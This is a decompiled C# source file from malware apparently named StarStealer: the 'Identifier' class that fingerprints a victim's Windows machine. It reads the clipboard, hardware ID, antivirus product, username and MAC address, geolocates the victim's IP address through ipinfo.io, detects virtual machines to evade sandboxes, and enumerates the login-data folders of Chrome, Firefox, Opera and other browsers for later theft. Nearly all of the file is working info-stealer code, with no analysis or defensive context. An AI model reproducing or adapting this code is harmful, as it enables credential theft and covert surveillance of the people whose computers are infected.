using Microsoft.Win32;
using Newtonsoft.Json;
using StarStealer.Entities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace StarStealer.Utilities
{
	public class Identifier
	{
		public struct IpInfo
		{
			public string ip
			{
				get;
				set;
			}

			public string country
			{
				get;
				set;
			}

			public string region
			{
				get;
				set;
			}

			public string city
			{
				get;
				set;
			}

			public string loc
			{
				get;
				set;
			}

			public string org
			{
				get;
				set;
			}

			public string postal
			{
				get;
				set;
			}
		}

		private static class PcCollectors
		{
			public static string GetRAM => RAM().ToString() + " GB";

			public static string Date()
			{
				try
				{
					string str = TimeZoneInfo.ConvertTime(DateTime.UtcNow, TimeZoneInfo.FindSystemTimeZoneById("Russian Standard Time")).ToLongDateString();
					string str2 = TimeZoneInfo.ConvertTime(DateTime.UtcNow, TimeZoneInfo.FindSystemTimeZoneById("Russian Standard Time")).ToShortTimeString();
					return str2 + " | " + str;
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return string.Empty;
			}

			[DllImport("kernel32.dll")]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);

			public static long RAM()
			{
				try
				{
					GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);
					return TotalMemoryInKilobytes / 1024 / 1024;
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return 0L;
			}

			public static string GetMacAddress()
			{
				try
				{
					string empty = string.Empty;
					IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
					NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
					empty = "Interface information for " + iPGlobalProperties.HostName + "." + iPGlobalProperties.DomainName + "\n";
					if (allNetworkInterfaces == null || allNetworkInterfaces.Length < 1)
					{
						return "No network interfaces found.";
					}
					empty += $"Number of interfaces .................... : {allNetworkInterfaces.Length}\n";
					NetworkInterface[] array = allNetworkInterfaces;
					foreach (NetworkInterface networkInterface in array)
					{
						IPInterfaceProperties iPProperties = networkInterface.GetIPProperties();
						empty = empty + networkInterface.Description + "\n";
						empty += string.Empty.PadLeft(networkInterface.Description.Length, '=');
						empty += "\n";
						empty += $"Interface type .......................... : {networkInterface.NetworkInterfaceType}\n";
						empty += "Physical address ........................ : ";
						PhysicalAddress physicalAddress = networkInterface.GetPhysicalAddress();
						byte[] addressBytes = physicalAddress.GetAddressBytes();
						for (int j = 0; j < addressBytes.Length; j++)
						{
							empty += addressBytes[j].ToString("X2");
							if (j != addressBytes.Length - 1)
							{
								empty += "-";
							}
						}
						empty += "\n";
					}
					return empty;
				}
				catch
				{
					return string.Empty;
				}
			}

			public static string GetWinName()
			{
				try
				{
					string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
					{
						if (registryKey != null)
						{
							try
							{
								string text = registryKey.GetValue("ProductName").ToString();
								if (text == "")
								{
									return "Unknown";
								}
								return text + " " + Is64();
							}
							catch (Exception ex)
							{
								return ex.Message;
							}
						}
						return "Unkown";
					}
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return string.Empty;
			}

			public static string GetCP()
			{
				string name = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
				{
					if (registryKey != null)
					{
						try
						{
							string text = registryKey.GetValue("ProcessorNameString").ToString();
							if (text == "")
							{
								return "Unknown";
							}
							return text;
						}
						catch (Exception item)
						{
							Program.Errors.Add(item);
							return string.Empty;
						}
					}
					return string.Empty;
				}
			}

			public static string GetVideo()
			{
				try
				{
					ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_DisplayControllerConfiguration");
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							return managementObject["Name"].ToString();
						}
					}
					return "Unknown";
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return string.Empty;
			}

			public static string Is64()
			{
				return Environment.Is64BitOperatingSystem ? "x64" : "x32";
			}

			public static string GetScreenResolution()
			{
				try
				{
					string str = Screen.PrimaryScreen.Bounds.Width.ToString();
					string str2 = Screen.PrimaryScreen.Bounds.Height.ToString();
					return str + "x" + str2;
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return string.Empty;
			}

			public static string GetAntivirus()
			{
				try
				{
					ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
					ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
					string result = string.Empty;
					foreach (ManagementObject item2 in managementObjectCollection)
					{
						result = item2["displayName"].ToString();
					}
					return result;
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return string.Empty;
			}

			public static string GetClipBoardText()
			{
				try
				{
					if (Clipboard.ContainsText(TextDataFormat.Text))
					{
						return Clipboard.GetText(TextDataFormat.Text);
					}
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
				}
				return string.Empty;
			}

			public static void GetBrowsersList(ref User user)
			{
				string name = string.Empty;
				string empty = string.Empty;
				string empty2 = string.Empty;
				string empty3 = string.Empty;
				string folder = string.Empty;
				foreach (string loginDataPath in LoginDataPaths)
				{
					if (Directory.Exists(loginDataPath))
					{
						if (loginDataPath.Contains("Chrome"))
						{
							name = "Google Chrome";
							folder = loginDataPath;
						}
						if (loginDataPath.Contains("Orbitum"))
						{
							name = "Orbitum Browser";
							folder = loginDataPath;
						}
						if (loginDataPath.Contains("Opera"))
						{
							name = "Opera Browser";
							folder = loginDataPath;
						}
						if (loginDataPath.Contains("Amigo"))
						{
							name = "Amigo Browser";
							folder = loginDataPath;
						}
						if (loginDataPath.Contains("Torch"))
						{
							name = "Torch Browser";
							folder = loginDataPath;
						}
						if (loginDataPath.Contains("Comodo"))
						{
							name = "Comodo Browser";
							folder = loginDataPath;
						}
						if (loginDataPath.Contains("Mozilla"))
						{
							name = "Mozilla Firefox";
						}
						if (loginDataPath.Contains("Chromium"))
						{
							name = "Chromium Browser";
							folder = loginDataPath;
						}
						try
						{
							user.Browsers.Add(new Browser
							{
								Name = name,
								LoginData = empty,
								CookiesData = empty3,
								WebData = empty2,
								Folder = folder
							});
						}
						catch (Exception item)
						{
							Program.Errors.Add(item);
						}
					}
				}
			}

			public static string GetHWID()
			{
				try
				{
					string str = "";
					ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementBaseObject current = managementObjectEnumerator.Current;
							ManagementObject managementObject = (ManagementObject)current;
							str = (string)managementObject["ProcessorId"];
						}
					}
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\");
					string str2 = (string)registryKey.GetValue("ProductName");
					registryKey.Close();
					using (MD5 mD = MD5.Create())
					{
						byte[] bytes = Encoding.ASCII.GetBytes(str2 + str);
						byte[] array = mD.ComputeHash(bytes);
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 0; i < array.Length; i++)
						{
							stringBuilder.Append(array[i].ToString("X2"));
						}
						return stringBuilder.ToString();
					}
				}
				catch (Exception item)
				{
					Program.Errors.Add(item);
					return string.Empty;
				}
			}
		}

		public static string LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");

		public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public static string StealerFolder = Path.Combine(LocalAppData, "Data");

		public static string StealerZip = string.Empty;

		public static List<string> LoginDataPaths = new List<string>
		{
			ApplicationData + "\\Mozilla\\Firefox\\Profiles\\",
			LocalAppData + "\\Google\\Chrome\\User Data",
			ApplicationData + "\\Opera Software\\Opera Stable",
			LocalAppData + "\\Kometa\\User Data",
			LocalAppData + "\\Orbitum\\User Data",
			LocalAppData + "\\Comodo\\Dragon\\User Data",
			LocalAppData + "\\Amigo\\User\\User Data",
			LocalAppData + "\\Torch\\User Data\\Default",
			LocalAppData + "\\Chromium\\User Data\\Default"
		};

		public static string GetNTVersion()
		{
			try
			{
				return _003CGetNTVersion_003Eg__GetOsVer_007C7_1();
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				return string.Empty;
			}
		}

		public static bool VMDetect()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject item in managementObjectCollection)
					{
						string text = item["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || item["Model"].ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
			}
			return false;
		}

		private static void GetIpInfo(ref User user)
		{
			try
			{
				WebRequest webRequest = WebRequest.CreateHttp("https://ipinfo.io/json");
				webRequest.Credentials = CredentialCache.DefaultCredentials;
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string value = streamReader.ReadToEnd();
				streamReader.Close();
				response.Close();
				IpInfo ipInfo = JsonConvert.DeserializeObject<IpInfo>(value);
				user.IP = ipInfo.ip;
				user.CountryCode = ipInfo.country;
				user.City = ipInfo.city;
				user.Zip = ipInfo.postal;
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
			}
		}

		private static void GetPCInfo(ref User user)
		{
			try
			{
				user.Processor = PcCollectors.GetCP();
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
			}
			try
			{
				user.RAM = PcCollectors.GetRAM;
			}
			catch (Exception item2)
			{
				Program.Errors.Add(item2);
			}
			try
			{
				user.ScreenResolution = PcCollectors.GetScreenResolution();
			}
			catch (Exception item3)
			{
				Program.Errors.Add(item3);
			}
			try
			{
				user.Video = PcCollectors.GetVideo();
			}
			catch (Exception item4)
			{
				Program.Errors.Add(item4);
			}
			try
			{
				user.WindowsVersion = PcCollectors.GetWinName();
			}
			catch (Exception item5)
			{
				Program.Errors.Add(item5);
			}
			try
			{
				user.Time = PcCollectors.Date();
			}
			catch (Exception item6)
			{
				Program.Errors.Add(item6);
			}
			try
			{
				user.UserName = WindowsIdentity.GetCurrent().Name.Split('\\').Last();
			}
			catch (Exception item7)
			{
				Program.Errors.Add(item7);
			}
			try
			{
				user.MachineName = WindowsIdentity.GetCurrent().Name.Split('\\').First();
			}
			catch (Exception item8)
			{
				Program.Errors.Add(item8);
			}
			try
			{
				user.AntiVirus = PcCollectors.GetAntivirus();
			}
			catch (Exception item9)
			{
				Program.Errors.Add(item9);
			}
			try
			{
				user.ClipBoardText = PcCollectors.GetClipBoardText();
			}
			catch (Exception item10)
			{
				Program.Errors.Add(item10);
			}
			try
			{
				user.Hwid = PcCollectors.GetHWID();
			}
			catch (Exception item11)
			{
				Program.Errors.Add(item11);
			}
			try
			{
				user.MacAddress = PcCollectors.GetMacAddress();
			}
			catch (Exception item12)
			{
				Program.Errors.Add(item12);
			}
			try
			{
				user.NT = GetNTVersion();
			}
			catch (Exception item13)
			{
				Program.Errors.Add(item13);
			}
			try
			{
				user.is64 = Environment.Is64BitOperatingSystem;
			}
			catch (Exception item14)
			{
				Program.Errors.Add(item14);
			}
			try
			{
				user.Country = Country.FromAlpha2(user.CountryCode).Name;
			}
			catch (Exception item15)
			{
				Program.Errors.Add(item15);
			}
		}

		public static void GetInfo(ref User user)
		{
			GetIpInfo(ref user);
			GetPCInfo(ref user);
			PcCollectors.GetBrowsersList(ref user);
		}

		[CompilerGenerated]
		private static ManagementObject _003CGetNTVersion_003Eg__GetMngObj_007C7_0(string className)
		{
			ManagementClass managementClass = new ManagementClass(className);
			foreach (ManagementBaseObject instance in managementClass.GetInstances())
			{
				ManagementObject managementObject = (ManagementObject)instance;
				if (managementObject != null)
				{
					return managementObject;
				}
			}
			return null;
		}

		[CompilerGenerated]
		private static string _003CGetNTVersion_003Eg__GetOsVer_007C7_1()
		{
			try
			{
				ManagementObject managementObject = _003CGetNTVersion_003Eg__GetMngObj_007C7_0("Win32_OperatingSystem");
				if (managementObject == null)
				{
					return string.Empty;
				}
				return managementObject["Version"] as string;
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				return string.Empty;
			}
		}
	}
}
